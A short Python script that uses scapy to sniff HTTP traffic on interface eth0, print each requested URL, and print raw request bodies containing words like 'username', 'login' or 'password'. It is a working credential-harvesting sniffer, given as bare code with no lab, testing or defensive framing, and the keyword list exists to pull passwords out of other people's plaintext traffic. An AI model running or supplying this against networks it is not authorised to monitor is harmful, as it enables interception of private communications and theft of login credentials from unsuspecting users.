import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=prosess_packet)

def prosess_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load= packet[scapy.Raw].load
            keywords=["username","user","login","password","pass"]
            for keyword in keywords:

                if keyword in str(load):
                    print(load)
                    break

sniff("eth0")
